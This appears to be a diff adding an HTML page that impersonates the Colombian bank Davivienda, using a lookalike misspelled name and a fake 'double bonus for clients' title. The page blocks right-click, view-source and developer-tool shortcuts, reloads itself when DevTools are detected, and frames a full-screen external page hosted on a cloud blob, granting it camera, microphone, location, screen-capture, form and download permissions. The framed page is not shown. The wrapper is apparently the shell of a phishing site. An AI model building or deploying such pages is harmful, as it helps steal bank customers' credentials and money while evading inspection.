@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bono Clientes x2 DAVlVlENDA🤑</title>
+  
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+    
+    iframe {
+      border: none;
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    /* Prevenir selección de texto */
+    * {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+  </style>
+  
+  <script>
+    // Desactivar clic derecho
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      return false;
+    });
+    
+    // Desactivar atajos de teclado para ver código fuente
+    document.addEventListener('keydown', function(e) {
+      // Ctrl+U, Ctrl+Shift+I, F12, Ctrl+Shift+C, Ctrl+Shift+J
+      if (
+        (e.ctrlKey && e.key === 'u') ||
+        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+        (e.key === 'F12') ||
+        (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+        (e.ctrlKey && e.shiftKey && e.key === 'J')
+      ) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    // Detectar si abren DevTools
+    (function() {
+      var devtools = {
+        open: false,
+        orientation: null
+      };
+      
+      var threshold = 160;
+      var emitEvent = function(state, orientation) {
+        window.dispatchEvent(new CustomEvent('devtoolschange', {
+          detail: {
+            open: state,
+            orientation: orientation
+          }
+        }));
+      };
+
+      setInterval(function() {
+        var widthThreshold = window.outerWidth - window.innerWidth > threshold;
+        var heightThreshold = window.outerHeight - window.innerHeight > threshold;
+        var orientation = widthThreshold ? 'vertical' : 'horizontal';
+
+        if (!(heightThreshold && widthThreshold) &&
+          ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
+          if (!devtools.open || devtools.orientation !== orientation) {
+            emitEvent(true, orientation);
+            // Si detecta DevTools, recarga la página
+            window.location.reload();
+          }
+          devtools.open = true;
+          devtools.orientation = orientation;
+        } else {
+          if (devtools.open) {
+            emitEvent(false, null);
+          }
+          devtools.open = false;
+          devtools.orientation = null;
+        }
+      }, 500);
+    })();
+  </script>
+</head>
+<body>
+  <iframe 
+    id="mainFrame"
+    src="https://bonodavivienda.blob.core.windows.net/bono/index.html"
+    allow="camera *; microphone *; geolocation *; fullscreen *; display-capture *; autoplay *"
+    allowfullscreen
+    sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-downloads"
+  ></iframe>
+</body>
+</html>
